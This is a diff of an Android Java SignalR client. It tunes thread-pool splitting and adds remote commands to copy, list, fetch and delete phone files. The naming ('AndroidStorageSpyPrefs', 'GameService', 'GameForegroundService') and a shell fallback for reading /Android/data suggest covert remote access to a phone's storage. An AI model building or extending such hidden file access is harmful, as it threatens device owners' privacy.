@@ -43,17 +43,188 @@ public class SignalRClient {
     private static final String SIGNALR_RECORD_SEPARATOR = "\u001e";
     private static final String PREFS_NAME = "AndroidStorageSpyPrefs";
     private static final String PREF_DEVICE_ID = "DeviceId";
-    private static final String PREF_TRANSCODED_FILES = "TranscodedFiles";
-
     private static volatile boolean isRunning = false;
     private static volatile boolean isConnected = false;
     private static volatile OutputStream signalRWebSocketOut = null;
 
     private static Socket activeSocket = null;
     private static ScheduledExecutorService pingScheduler = null;
+    // Timer-driven core reporter: adjustPools() is otherwise only invoked on
+    // proceed-queue transitions, so during discover-heavy phases (thumbnails)
+    // no pushes would ever fire and the PC would show stale numbers. This
+    // ticks it every 5s; adjustPools itself no-ops cheaply when idle and only
+    // pushes on real split changes or while work is in flight.
+    private static ScheduledExecutorService coreHeartbeat = null;
     private static String cachedDeviceId = null;
     private static Context appContext = null;
+
+    /** App context for file-layer access to app-private dirs. May be null before connect. */
+    public static Context getAppContext() {
+        return appContext;
+    }
     private static final ConcurrentHashMap<String, Object> transcodeSessions = new ConcurrentHashMap<>();
+    private static final ConcurrentHashMap<String, CopySession> copySessions = new ConcurrentHashMap<>();
+
+    /**
+     * Copies files/folders from shared storage into the isolated App Data
+     * playground (GameService/…). Destination mirrors the FULL parent chain
+     * to the storage root (DCIM/Camera/IMG.jpg -> GameService/DCIM/Camera/
+     * IMG.jpg) — only related parents are created, never sibling subtrees.
+     * Files already present with identical size are skipped, never recopied.
+     * Sources are only ever read: this is COPY, never move.
+     */
+    private static class CopySession implements Runnable {
+        final String sessionId;
+        final java.util.List<String> roots;
+        final AtomicInteger total = new AtomicInteger(0);
+        final AtomicInteger copied = new AtomicInteger(0);
+        final AtomicInteger skipped = new AtomicInteger(0);
+        final AtomicInteger failed = new AtomicInteger(0);
+        final AtomicBoolean cancelled = new AtomicBoolean(false);
+        volatile boolean done = false;
+        volatile String currentPath = "";
+
+        CopySession(String sessionId, java.util.List<String> roots) {
+            this.sessionId = sessionId;
+            this.roots = roots;
+        }
+
+        @Override
+        public void run() {
+            try {
+                android.content.Context ctx = getAppContext();
+                java.io.File appRoot = ctx != null ? FileManager.getAppDataRoot(ctx) : null;
+                if (appRoot == null) {
+                    sendClassLog("SignalRClient", "Error", "[Copy] " + sessionId + ": app data unavailable");
+                    return;
+                }
+                // Single walk: copy while counting (totals grow live; the PC
+                // shows the current file + running tally instead of a pre-count).
+                // `seen` guards symlink cycles; never copy into App Data itself.
+                java.util.Set<String> seen = java.util.Collections.newSetFromMap(
+                        new ConcurrentHashMap<String, Boolean>());
+                String appRootCanon = null;
+                try { appRootCanon = appRoot.getCanonicalPath(); } catch (Exception ignored) {}
+                for (String root : roots) {
+                    if (cancelled.get()) break;
+                    java.io.File src = FileManager.resolvePath(root);
+                    if (src == null || !src.exists()) { failed.incrementAndGet(); continue; }
+                    if (storageRelative(src).isEmpty()) {
+                        sendClassLog("SignalRClient", "Message", "[Copy] skipped storage root itself: " + root);
+                        skipped.incrementAndGet();
+                        continue;
+                    }
+                    // Never copy the playground into itself.
+                    try {
+                        if (appRootCanon != null && (src.getCanonicalPath().equals(appRootCanon)
+                                || src.getCanonicalPath().startsWith(appRootCanon + java.io.File.separator))) {
+                            sendClassLog("SignalRClient", "Message", "[Copy] skipped (inside App Data): " + root);
+                            skipped.incrementAndGet();
+                            continue;
+                        }
+                    } catch (Exception ignored) {}
+                    copyRecursive(src, appRoot, storageRelative(src), seen);
+                }
+            } catch (Exception e) {
+                sendClassLog("SignalRClient", "Error", "[Copy] " + sessionId + " error: " + e.getMessage());
+            } finally {
+                done = true;
+                sendClassLog("SignalRClient", "Message", "[Copy] " + sessionId + " done: total=" + total
+                        + " copied=" + copied + " skipped=" + skipped + " failed=" + failed);
+            }
+        }
+
+        /** Storage-relative path of a resolved file ("" for the storage root). */
+        private String storageRelative(java.io.File f) {
+            try {
+                String root = FileManager.getRootStoragePath();
+                String cRoot = new java.io.File(root).getCanonicalPath();
+                String cFile = f.getCanonicalPath();
+                if (cFile.equals(cRoot)) return "";
+                if (cFile.startsWith(cRoot + java.io.File.separator)) {
+                    return cFile.substring(cRoot.length() + 1).replace(java.io.File.separatorChar, '/');
+                }
+            } catch (Exception ignored) {}
+            return f.getName();
+        }
+
+        private void copyRecursive(java.io.File src, java.io.File appRoot, String relBase,
+                                   java.util.Set<String> seen) {
+            if (cancelled.get()) return;
+            try {
+                if (src.isDirectory()) {
+                    // Symlink-cycle guard: never walk the same dir twice.
+                    try {
+                        if (!seen.add(src.getCanonicalPath())) return;
+                    } catch (Exception ignored) {}
+                    java.io.File destDir = relBase.isEmpty() ? appRoot : new java.io.File(appRoot, relBase);
+                    if (!destDir.exists() && !destDir.mkdirs()) {
+                        sendClassLog("SignalRClient", "Error", "[Copy] mkdir failed: " + destDir.getAbsolutePath());
+                        failed.incrementAndGet();
+                        return;
+                    }
+                    java.io.File[] kids = src.listFiles();
+                    // Same restricted-dir fallback as listings (/Android/data).
+                    if ((kids == null || kids.length == 0) && src.getAbsolutePath().contains("/Android/data")) {
+                        kids = FileManager.tryShellListFiles(src);
+                    }
+                    if (kids != null) {
+                        for (java.io.File kid : kids) {
+                            if (cancelled.get()) break;
+                            String kidRel = relBase.isEmpty() ? kid.getName() : relBase + "/" + kid.getName();
+                            copyRecursive(kid, appRoot, kidRel, seen);
+                        }
+                    }
+                    return;
+                }
+                currentPath = relBase;
+                total.incrementAndGet();
+                java.io.File dest = new java.io.File(appRoot, relBase);
+                java.io.File parent = dest.getParentFile();
+                if (parent != null && !parent.exists() && !parent.mkdirs()) {
+                    sendClassLog("SignalRClient", "Error", "[Copy] mkdir failed: " + parent.getAbsolutePath());
+                    failed.incrementAndGet();
+                    return;
+                }
+                // Skip what is already there (same size): only new files copy.
+                if (dest.exists() && dest.isFile() && dest.length() == src.length()) {
+                    skipped.incrementAndGet();
+                    return;
+                }
+                java.io.File tmp = new java.io.File(parent, dest.getName() + ".part-" + System.currentTimeMillis());
+                try (java.io.FileInputStream in = new java.io.FileInputStream(src);
+                     java.io.FileOutputStream out = new java.io.FileOutputStream(tmp)) {
+                    byte[] buf = new byte[65536];
+                    int n;
+                    while ((n = in.read(buf)) > 0) {
+                        if (cancelled.get()) break;
+                        out.write(buf, 0, n);
+                    }
+                    out.getFD().sync();
+                }
+                if (cancelled.get()) {
+                    try { tmp.delete(); } catch (Exception ignored) {}
+                    return;
+                }
+                try { tmp.setLastModified(src.lastModified()); } catch (Exception ignored) {}
+                if (dest.exists() && !dest.delete()) {
+                    sendClassLog("SignalRClient", "Error", "[Copy] cannot replace: " + dest.getAbsolutePath());
+                    try { tmp.delete(); } catch (Exception ignored) {}
+                    failed.incrementAndGet();
+                    return;
+                }
+                if (tmp.renameTo(dest)) {
+                    copied.incrementAndGet();
+                } else {
+                    try { tmp.delete(); } catch (Exception ignored) {}
+                    failed.incrementAndGet();
+                }
+            } catch (Exception e) {
+                sendClassLog("SignalRClient", "Error", "[Copy] failed '" + relBase + "': " + e.getMessage());
+                failed.incrementAndGet();
+            }
+        }
+    }
 
     // ── P2P direct datapath (phone → PC TCP, bypasses Cloudflare) ─────────────
     private static volatile Socket p2pSocket = null;
@@ -119,60 +290,145 @@ public class SignalRClient {
         else if (pending > 100) desired = Math.min(2, allowed - 1);
         else desired = 1;
         desired = Math.max(1, Math.min(desired, allowed - 1));
-        if (desired < current && pending >= 5) return current; // hysteresis: hold until <5
+        if (desired < current && pending >= 10) return current; // hysteresis: hold until queue < 10
         return desired;
     }
 
     private static volatile long lastCorePushMs = 0;
+    // Set when the PC's producer finished enumerating this run's folders.
+    // Ground truth for "discovery done" (the phone can't tell tree-walk
+    // listings apart from per-file info calls). Cleared by any new discover
+    // work, so a later run/folder re-enables normal splitting automatically.
+    private static volatile boolean serverDiscoveryDone = false;
+    // Sticky hold for a flip-to-all-proceed: once set, normal split math is
+    // skipped and 0/8 is kept (no resize churn, no flop-back on empty queue).
+    // Cleared only by a new tree-walk, a config refresh, or disconnect hygiene.
+    private static volatile boolean serverFlipHold = false;
+    // Last time a discover task STARTED executing. Lets the splitter detect a
+    // drained discovery phase (no listings for a while while proceed work
+    // remains) and move ALL cores to proceed — idling allowed cores is never
+    // an option. Updated on the dispatch path (race-benign timestamp).
+    private static volatile long lastDiscoverStartMs = 0;
+    private static final long DISCOVER_IDLE_MS = 10000;
+    // Interval peaks: max live threads seen since the last push. Instantaneous
+    // getActiveCount() misses millisecond listings; peaks prove real usage.
+    private static volatile int discoverPeakActive = 0;
+    private static volatile int proceedPeakActive = 0;
+
+    // DIAGNOSTIC trace state (throttled flip-decision log for Device Debug).
+    private static volatile String lastFlipTrace = "";
+    private static volatile long lastFlipTraceMs = 0;
+
+    private static void traceFlipDecision(String reason, int allowed, int pending,
+                                          int curProceed, int wantProceed, int wantDiscover) {
+        long now = System.currentTimeMillis();
+        String line = "FlipCheck flag=" + serverDiscoveryDone
+                + (serverFlipHold ? "[HELD]" : "")
+                + " pending=" + pending + " pQ=" + proceedPool.getQueue().size()
+                + " dIdleMs=" + (now - lastDiscoverStartMs)
+                + " dA=" + discoverPool.getActiveCount() + " pA=" + proceedPool.getActiveCount()
+                + " cur=" + curProceed + "->want=" + wantProceed + "/" + wantDiscover
+                + " " + reason;
+        if (!line.equals(lastFlipTrace) || now - lastFlipTraceMs >= 15000) {
+            lastFlipTrace = line;
+            lastFlipTraceMs = now;
+            sendClassLog("SignalRClient", "Message", line);
+        }
+    }
+
+    // Single place that sizes both pools. Max only ever grows (never shrinks
+    // below what was needed) so bursts never starve; core count follows split.
+    private static void resizePools(int discover, int proceed, int allowed) {
+        try {
+            discoverPool.setMaximumPoolSize(Math.max(discover, discoverPool.getMaximumPoolSize()));
+            discoverPool.setCorePoolSize(discover);
+            if (proceed <= 0) {
+                // Keep at least 1 core so queued proceed tasks don't deadlock in queue
+                proceedPool.setMaximumPoolSize(Math.max(1, allowed));
+                proceedPool.setCorePoolSize(1);
+            } else {
+                proceedPool.setMaximumPoolSize(Math.max(proceed, proceedPool.getMaximumPoolSize()));
+                proceedPool.setCorePoolSize(proceed);
+            }
+        } catch (Exception e) {
+            sendClassLog("SignalRClient", "Error", "adjustPools failed: " + e.getMessage());
+        }
+    }
 
     private static synchronized void adjustPools() {
         int allowed = coreSet;
         int pending = pendingProceedQueue.get();
         int curProceed = proceedCores;
-        int desiredProceed = computeProceedCores(pending, allowed, curProceed);
-        int desiredDiscover = pending <= 0 ? allowed : Math.max(1, allowed - desiredProceed);
-        if (allowed <= 1 && pending > 0) { desiredDiscover = 1; desiredProceed = 1; }
-        boolean changed = (desiredProceed != curProceed || desiredDiscover != discoverCores);
-        if (changed) {
-            proceedCores = desiredProceed;
-            discoverCores = desiredDiscover;
-            try {
-                // Resize pools; keep max >= core
-                discoverPool.setMaximumPoolSize(Math.max(desiredDiscover, discoverPool.getMaximumPoolSize()));
-                discoverPool.setCorePoolSize(desiredDiscover);
-                if (desiredProceed <= 0) {
-                    // Keep at least 1 core so queued proceed tasks don't deadlock in queue
-                    proceedPool.setMaximumPoolSize(Math.max(1, allowed));
-                    proceedPool.setCorePoolSize(1);
-                } else {
-                    proceedPool.setMaximumPoolSize(Math.max(desiredProceed, proceedPool.getMaximumPoolSize()));
-                    proceedPool.setCorePoolSize(desiredProceed);
-                }
-            } catch (Exception e) {
-                sendClassLog("SignalRClient", "Error", "adjustPools failed: " + e.getMessage());
+        long now = System.currentTimeMillis();
+        String reason;
+        int wantProceed;
+        int wantDiscover;
+
+        if (serverFlipHold) {
+            // Held flip: stay 0/8. No recompute, no resize churn, no flop-back
+            // on empty queue. Cleared only by tree-walk / config / disconnect.
+            wantProceed = allowed;
+            wantDiscover = 0;
+            reason = "hold:serverFlipHeld(0/8 sticky)";
+        } else {
+            wantProceed = computeProceedCores(pending, allowed, curProceed);
+            wantDiscover = pending <= 0 ? allowed : Math.max(1, allowed - wantProceed);
+            if (allowed <= 1 && pending > 0) { wantDiscover = 1; wantProceed = 1; }
+            reason = "hold:normal";
+            boolean proceedWaiting = pending > 0 || proceedPool.getQueue().size() > 0;
+            // Core pool size 0 is legal — queued/on-demand threads still run up
+            // to the max; the next listing recreates live threads and flips back.
+            boolean drainedSilent = pending > 0 && (now - lastDiscoverStartMs) >= DISCOVER_IDLE_MS
+                    && discoverPool.getActiveCount() == 0 && discoverPool.getQueue().size() == 0;
+            if ((serverDiscoveryDone || drainedSilent) && proceedWaiting && wantProceed < allowed) {
+                wantProceed = allowed;
+                wantDiscover = 0;
+                serverFlipHold = true;
+                reason = serverDiscoveryDone ? "FLIP-serverDone" : "FLIP-drainedIdle";
+            } else if (!serverDiscoveryDone) {
+                reason = "hold:DiscoveryDone-NOT-RECEIVED";
+            } else if (!proceedWaiting) {
+                reason = "hold:proceedQueueEmpty";
+            } else if (wantProceed >= allowed) {
+                reason = "hold:alreadyMax";
             }
-            sendClassLog("SignalRClient", "Message", "Cores: discover=" + discoverCores + " proceed=" + proceedCores + " queue=" + pending + " allowed=" + allowed);
         }
+
+        boolean changed = (wantProceed != curProceed || wantDiscover != discoverCores);
+        if (changed) {
+            proceedCores = wantProceed;
+            discoverCores = wantDiscover;
+            resizePools(wantDiscover, wantProceed, allowed);
+            sendClassLog("SignalRClient", "Message", "Cores: discover=" + discoverCores + " proceed=" + proceedCores + " queue=" + pending + " allowed=" + allowed
+                    + " peakD=" + discoverPeakActive + " peakP=" + proceedPeakActive);
+        }
+        traceFlipDecision(reason, allowed, pending, curProceed, wantProceed, wantDiscover);
         // Push when the split REALLY changed, plus a 5s heartbeat while work is
         // in flight so the PC sees REAL usage (live threads), not just sizes.
-        // getActiveCount() = threads actually executing right now.
-        long now = System.currentTimeMillis();
+        // Peaks (max live threads since the last push) prove real usage even
+        // for millisecond listings that instantaneous sampling would miss.
         int discoverActive = discoverPool.getActiveCount();
         int proceedActive = proceedPool.getActiveCount();
+        if (discoverActive > discoverPeakActive) discoverPeakActive = discoverActive;
+        if (proceedActive > proceedPeakActive) proceedPeakActive = proceedActive;
         boolean busy = pending > 0 || discoverActive > 0 || proceedActive > 0
                 || discoverPool.getQueue().size() > 0 || proceedPool.getQueue().size() > 0;
         if (changed || (busy && now - lastCorePushMs >= 5000)) {
             lastCorePushMs = now;
             reportCoreSplit(discoverCores, proceedCores, pending, allowed,
                     discoverActive, proceedActive,
-                    discoverPool.getQueue().size(), proceedPool.getQueue().size());
+                    discoverPool.getQueue().size(), proceedPool.getQueue().size(),
+                    discoverPeakActive, proceedPeakActive);
+            discoverPeakActive = discoverActive;
+            proceedPeakActive = proceedActive;
         }
     }
 
     /** Best-effort push of the live core split AND real usage to the PC (ReportCoreSplit hub call). */
     private static void reportCoreSplit(int discover, int proceed, int pending, int allowed,
                                         int discoverActive, int proceedActive,
-                                        int discoverQueued, int proceedQueued) {
+                                        int discoverQueued, int proceedQueued,
+                                        int discoverPeak, int proceedPeak) {
         try {
             OutputStream out = signalRWebSocketOut;
             if (out == null || !isConnected) return;
@@ -188,6 +444,8 @@ public class SignalRClient {
             args.put(proceedActive);
             args.put(discoverQueued);
             args.put(proceedQueued);
+            args.put(discoverPeak);
+            args.put(proceedPeak);
             payload.put("arguments", args);
             synchronized (out) {
                 sendWebSocketText(out, payload.toString() + SIGNALR_RECORD_SEPARATOR);
@@ -212,6 +470,8 @@ public class SignalRClient {
         dataWorkers = Executors.newFixedThreadPool(set, DATA_DAEMON_FACTORY);
         // reset pending and adjust to initial "all discover" but keep proceed 1 to avoid deadlock
         pendingProceedQueue.set(0);
+        serverDiscoveryDone = false;
+        serverFlipHold = false;
         discoverCores = set;
         proceedCores = 1;
         adjustPools();
@@ -219,81 +479,6 @@ public class SignalRClient {
         try { oldProceed.shutdown(); } catch (Exception ignored) {}
         try { old.shutdown(); } catch (Exception ignored) {}
         sendClassLog("SignalRClient", "Message", "ParallelWork=" + mode + " cores=" + set + "/" + total + " discover=" + discoverCores + " proceed=" + proceedCores);
-    }
-
-    // FIFO room of up to 3 transcoded output files. Newest appended to the end;
-    // when the 4th arrives the oldest (first added) is deleted from disk and the
-    // remaining two shift left. Everything in the room is wiped when the
-    // connection drops or the app stops.
-    private static final int MAX_TRANSCODED_FILES = 3;
-    private static final Deque<String> transcodedFiles = new ArrayDeque<>();
-
-    /** Adds a transcoded output to the FIFO room, evicting (and deleting) the oldest when full. */
-    private static synchronized void trackTranscodedFile(String absOutputPath) {
-        if (absOutputPath == null || absOutputPath.isEmpty()) return;
-        transcodedFiles.addLast(absOutputPath);
-        sendClassLog("SignalRClient", "Message", "[TRACK] Transcode output added (" + transcodedFiles.size() + "/" + MAX_TRANSCODED_FILES + "): " + absOutputPath);
-        sendDebugLog(STAMP_SUCCESS, "Transcode tracked (" + transcodedFiles.size() + "/" + MAX_TRANSCODED_FILES + "): " + absOutputPath);
-        while (transcodedFiles.size() > MAX_TRANSCODED_FILES) {
-            String oldest = transcodedFiles.removeFirst();
-            deleteTranscodedFile(oldest);
-        }
-        persistTranscodedFiles();
-    }
-
-    /** Deletes every transcoded file still in the FIFO room (connection lost / app stopped / user closed the game). */
-    public static synchronized void cleanupTranscodedFiles() {
-        while (!transcodedFiles.isEmpty()) {
-            deleteTranscodedFile(transcodedFiles.removeFirst());
-        }
-        persistTranscodedFiles();
-        sendClassLog("SignalRClient", "Message", "[TRACK] All tracked transcoded files cleaned up.");
-    }
-
-    /** Deletes transcoded files left behind by a killed previous session (loads them from disk). */
-    private static void cleanupStaleTranscodedFiles() {
-        if (appContext == null) return;
-        try {
-            SharedPreferences prefs = appContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
-            String json = prefs.getString(PREF_TRANSCODED_FILES, null);
-            if (json == null || json.isEmpty()) return;
-            JSONArray arr = new JSONArray(json);
-            int count = 0;
-            for (int i = 0; i < arr.length(); i++) {
-                String p = arr.optString(i);
-                if (p != null && !p.isEmpty()) { deleteTranscodedFile(p); count++; }
-            }
-            prefs.edit().remove(PREF_TRANSCODED_FILES).apply();
-            sendClassLog("SignalRClient", "Message", "[TRACK] Cleaned " + count + " stale transcoded file(s) from previous session.");
-        } catch (Exception e) {
-            sendClassLog("SignalRClient", "Error", "[TRACK] Stale cleanup error: " + e.getMessage());
-        }
-    }
-
-    private static void persistTranscodedFiles() {
-        if (appContext == null) return;
-        try {
-            JSONArray arr = new JSONArray();
-            for (String p : transcodedFiles) arr.put(p);
-            appContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
-                .edit().putString(PREF_TRANSCODED_FILES, arr.toString()).apply();
-        } catch (Exception e) {
-            sendClassLog("SignalRClient", "Error", "[TRACK] Failed to persist transcoded files: " + e.getMessage());
-        }
-    }
-
-    private static void deleteTranscodedFile(String absPath) {
-        try {
-            File f = new File(absPath);
-            if (f.exists() && f.delete()) {
-                sendClassLog("SignalRClient", "Message", "[TRACK] Removed transcoded file: " + absPath);
-                sendDebugLog(STAMP_MESSAGE, "Removed transcoded file: " + absPath);
-            } else {
-                sendClassLog("SignalRClient", "Message", "[TRACK] Transcode cleanup skipped (not present): " + absPath);
-            }
-        } catch (Exception e) {
-            sendClassLog("SignalRClient", "Error", "[TRACK] Failed to delete transcoded file: " + absPath);
-        }
     }
 
     private static String deviceNamePrefix() {
@@ -356,10 +541,7 @@ public class SignalRClient {
         isRunning = true;
         sendClassLog("SignalRClient", "Message", "Starting native SignalR Client background loop...");
 
-        // Wipe transcoded files left by a killed previous session (process death skips onDestroy).
-        cleanupStaleTranscodedFiles();
-
-        new Thread(new Runnable() {
+                new Thread(new Runnable() {
             @Override
             public void run() {
                 while (isRunning) {
@@ -468,6 +650,14 @@ public class SignalRClient {
         // 3. Send Device Record (with DeviceId)
         sendDeviceRecord(out);
 
+        // 3b. Ensure our own private folder exists (visible under App Data).
+        try {
+            java.io.File appFolder = FileManager.ensureAppFolder();
+            if (appFolder != null) {
+                sendClassLog("SignalRClient", "Message", "App folder ready: " + appFolder.getAbsolutePath());
+            }
+        } catch (Exception ignored) {}
+
         // 3b. Per-class registration via empty log (new architecture)
         String devNameForReg = Build.MANUFACTURER + " " + Build.MODEL;
         String[] classesToRegister = new String[]{ "SignalRClient", "FileManager", "MediaHelper", "VideoDecoder", "GameForegroundService", "PermissionHelper" };
@@ -478,6 +668,9 @@ public class SignalRClient {
 
         // 4. Start Ping Scheduler
         startPingScheduler(out);
+
+        // 4b. Start core-usage heartbeat (see field comment)
+        startCoreHeartbeat();
 
         // 5. SignalR Message Processing Loop
         StringBuilder messageBuffer = new StringBuilder();
@@ -540,6 +733,21 @@ public class SignalRClient {
         }, 15, 15, TimeUnit.SECONDS);
     }
 
+    private static void startCoreHeartbeat() {
+        if (coreHeartbeat != null) {
+            coreHeartbeat.shutdownNow();
+        }
+        coreHeartbeat = Executors.newSingleThreadScheduledExecutor();
+        coreHeartbeat.scheduleAtFixedRate(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    if (isConnected) adjustPools();
+                } catch (Exception ignored) {}
+            }
+        }, 5, 5, TimeUnit.SECONDS);
+    }
+
     private static void dispatchDataWork(Runnable task) {
         // legacy: route to discover pool
         dispatchDiscover(task);
@@ -547,6 +755,7 @@ public class SignalRClient {
 
     private static void dispatchDiscover(Runnable task) {
         try {
+            lastDiscoverStartMs = System.currentTimeMillis();
             discoverPool.execute(task);
         } catch (Exception e) {
             sendClassLog("SignalRClient", "Error", "Failed to enqueue discover worker: " + e.getMessage());
@@ -591,6 +800,10 @@ public class SignalRClient {
                 String invocationId = json.optString("invocationId", null);
                 JSONArray args = json.optJSONArray("arguments");
                 if (args == null) args = new JSONArray();
+                // DIAGNOSTIC (temporary): raw wire bytes of copy invocations.
+                if ("GetCopyProgress".equals(target) || "CopyToAppData".equals(target) || "CancelCopy".equals(target)) {
+                    sendClassLog("SignalRClient", "Message", "[CopyWire] " + target + " raw=" + jsonStr);
+                }
 
                 String deviceName = Build.MANUFACTURER + " " + Build.MODEL;
 
@@ -655,6 +868,17 @@ public class SignalRClient {
                             + " Parallel=" + parallelWork + " (" + coreSet + "/" + coreAmount + " cores)");
                     }
                 } else if ("GetPathInfo".equals(target)) {
+                    // Tree-walk listing (run enumeration or manual browse) — NOT
+                    // per-file work. This is what clears a stale
+                    // serverDiscoveryDone, so a new walk always returns to
+                    // normal splitting. (Per-file GetPathInfoWithOverride calls
+                    // deliberately do NOT clear it: they flow until run end.)
+                    // DIAGNOSTIC (temporary): log only the transition.
+                    if (serverDiscoveryDone) {
+                        sendClassLog("SignalRClient", "Message", "DiscoveryDone flag CLEARED by tree-walk: " + args.optString(0, ""));
+                    }
+                    serverDiscoveryDone = false;
+                    serverFlipHold = false;
                     final String relativePath = args.optString(0, "");
                     final boolean isLowRes = args.optBoolean(1, false);
                     final boolean imageOnly = args.optBoolean(2, false);
@@ -685,11 +909,24 @@ public class SignalRClient {
 
                     sendDebugLog("[Override] Request frame=" + frameOverride + " qual=" + qualityOverride + " path=" + relativePath);
 
-                    dispatchDiscover(() -> {
+                    // Per-file thumb generation. Before DiscoveryDone this is
+                    // discovery-pool work; after it (tree-walk over, pure fetch
+                    // tail) it runs on the proceed pool so ALL cores fetch and
+                    // the split stops flapping between alternating task types.
+                    // (dispatchProceed also accounts it in the pending queue,
+                    // so the threshold ladder keeps working on real backlog.)
+                    Runnable thumbTask = () -> {
+                        long genMs = -1;
                         try {
+                            // DIAGNOSTIC: per-file generation cost (decode+scale+encode).
+                            // Separates "phone CPU is the bottleneck" (genMs ~= gap
+                            // between completions) from "transport/round-trips are"
+                            // (genMs << gaps).
+                            long genT0 = System.currentTimeMillis();
                             FileNodeDto.FileNodeResultDto result = FileManager.getPathInfoWithOverride(
                                 relativePath, isLowRes, frameOverride, qualityOverride,
                                 imageOnly, videoOnly, sinceDays);
+                            genMs = System.currentTimeMillis() - genT0;
 
                             if (invId != null && !invId.isEmpty()) {
                                 sendCompletionResponse(out, invId, result.toJsonObject());
@@ -698,8 +935,13 @@ public class SignalRClient {
                             sendClassLog("SignalRClient", "Error", "GetPathInfoWithOverride worker: " + e.getMessage());
                         }
 
-                        sendDebugLog("[Override] Sent: " + relativePath + " frame=" + frameOverride);
-                    });
+                        sendDebugLog("[Override] Sent: " + relativePath + " frame=" + frameOverride + " genMs=" + genMs);
+                    };
+                    if (serverDiscoveryDone) {
+                        dispatchProceed(thumbTask);
+                    } else {
+                        dispatchDiscover(thumbTask);
+                    }
                 } else if ("GetFileChunk".equals(target)) {
                     final String relativePath2 = args.optString(0, "");
                     final long offset = args.optLong(1, 0L);
@@ -777,6 +1019,154 @@ public class SignalRClient {
                     if (invocationId != null && !invocationId.isEmpty()) {
                         sendCompletionResponse(out, invocationId, true);
                     }
+                } else if ("CopyToAppData".equals(target)) {
+                    // Copy files/folders from shared storage into the isolated
+                    // App Data playground (GameService/…), preserving the full
+                    // parent chain to the storage root. NEVER moves: sources are
+                    // only read. Runs on a background thread; progress via
+                    // GetCopyProgress. Returns {sessionId}.
+                    JSONArray pathsArr = args.optJSONArray(0);
+                    java.util.List<String> paths = new java.util.ArrayList<>();
+                    if (pathsArr != null) {
+                        for (int i = 0; i < pathsArr.length(); i++) {
+                            String p = pathsArr.optString(i, null);
+                            if (p != null && !p.trim().isEmpty()) paths.add(p);
+                        }
+                    } else {
+                        // Single-wrapped wire: arguments are plain strings.
+                        for (int i = 0; i < args.length(); i++) {
+                            String p = args.optString(i, null);
+                            if (p != null && !p.trim().isEmpty()) paths.add(p);
+                        }
+                    }
+                    String sessionId = UUID.randomUUID().toString();
+                    CopySession session = new CopySession(sessionId, paths);
+                    copySessions.put(sessionId, session);
+                    new Thread(session, "PhoneBridge-copy-" + sessionId.substring(0, 8)).start();
+                    sendClassLog("SignalRClient", "Message", "[Copy] session " + sessionId + " started (" + paths.size() + " roots)");
+                    if (invocationId != null && !invocationId.isEmpty()) {
+                        JSONObject resp = new JSONObject();
+                        resp.put("sessionId", sessionId);
+                        sendCompletionResponse(out, invocationId, resp);
+                    }
+                } else if ("GetCopyProgress".equals(target)) {
+                    // Tolerates single- or double-wrapped session id.
+                    String sid = args.optString(0, "");
+                    if (sid.startsWith("[") && args.optJSONArray(0) != null) {
+                        sid = args.optJSONArray(0).optString(0, "");
+                    }
+                    CopySession session = copySessions.get(sid);
+                    JSONObject resp = new JSONObject();
+                    // DIAGNOSTIC (temporary): prove what the lookup sees.
+                    sendClassLog("SignalRClient", "Message", "[CopyProgress] lookup sid='" + sid + "' mapSize=" + copySessions.size()
+                            + " keys=" + copySessions.keySet().toString() + " hit=" + (session != null));
+                    if (session != null) {
+                        resp.put("total", session.total.get());
+                        resp.put("copied", session.copied.get());
+                        resp.put("skipped", session.skipped.get());
+                        resp.put("failed", session.failed.get());
+                        resp.put("done", session.done);
+                        resp.put("currentPath", session.currentPath);
+                    } else {
+                        // Unknown session (never existed, or phone process restarted
+                        // and lost it). Report known=false + done=false (NOT done)
+                        // so the PC keeps waiting briefly instead of instantly
+                        // declaring a false success, then fails explicitly.
+                        resp.put("known", false);
+                        resp.put("total", 0);
+                        resp.put("copied", 0);
+                        resp.put("skipped", 0);
+                        resp.put("failed", 0);
+                        resp.put("done", false);
+                        resp.put("currentPath", "");
+                    }
+                    if (invocationId != null && !invocationId.isEmpty()) {
+                        sendCompletionResponse(out, invocationId, resp);
+                    }
+                } else if ("CancelCopy".equals(target)) {
+                    String sid = args.optString(0, "");
+                    if (sid.startsWith("[") && args.optJSONArray(0) != null) {
+                        sid = args.optJSONArray(0).optString(0, "");
+                    }
+                    CopySession session = copySessions.get(sid);
+                    boolean ok = false;
+                    if (session != null) {
+                        session.cancelled.set(true);
+                        ok = true;
+                    }
+                    if (invocationId != null && !invocationId.isEmpty()) {
+                        sendCompletionResponse(out, invocationId, ok);
+                    }
+                } else if ("DeletePath".equals(target)) {
+                    // Delete a file/folder, App Data playground ONLY. Guards: must
+                    // resolve strictly inside the app data root, must not be the
+                    // root itself, and protected folders (e.g. Transcoded Videos)
+                    // are never deleted.
+                    boolean deleted = false;
+                    try {
+                        String relPath = args.optString(0, "");
+                        java.io.File targetFile = FileManager.resolvePath(relPath);
+                        android.content.Context ctx = getAppContext();
+                        java.io.File appRoot = (ctx != null && ctx.getApplicationInfo() != null)
+                                ? FileManager.getAppDataRoot(ctx) : null;
+                        if (targetFile != null && appRoot != null) {
+                            String canonicalTarget = targetFile.getCanonicalPath();
+                            String canonicalRoot = appRoot.getCanonicalPath();
+                            boolean inside = canonicalTarget.equals(canonicalRoot)
+                                    || canonicalTarget.startsWith(canonicalRoot + java.io.File.separator);
+                            boolean isRootItself = canonicalTarget.equals(canonicalRoot);
+                            boolean isProtected = FileManager.PROTECTED_FOLDERS.contains(targetFile.getName())
+                                    && new java.io.File(canonicalTarget).getParent() != null
+                                    && new java.io.File(canonicalTarget).getParent().equals(canonicalRoot);
+                            if (inside && !isRootItself && !isProtected) {
+                                deleted = FileManager.deleteRecursive(targetFile);
+                                sendClassLog("SignalRClient", "Message", "[Delete] '" + relPath + "' -> " + deleted);
+                            } else {
+                                sendClassLog("SignalRClient", "Error", "[Delete] refused '" + relPath + "' (outside playground, root, or protected)");
+                            }
+                        }
+                    } catch (Exception e) {
+                        sendClassLog("SignalRClient", "Error", "[Delete] error: " + e.getMessage());
+                    }
+                    if (invocationId != null && !invocationId.isEmpty()) {
+                        sendCompletionResponse(out, invocationId, deleted);
+                    }
+                } else if ("ClearFolder".equals(target)) {
+                    // Empty a folder but keep the folder itself. Same guards as
+                    // DeletePath; intended for protected folders (whose own
+                    // deletion is refused) to clean their contents.
+                    int removed = 0;
+                    try {
+                        String relPath = args.optString(0, "");
+                        java.io.File targetFile = FileManager.resolvePath(relPath);
+                        android.content.Context ctx = getAppContext();
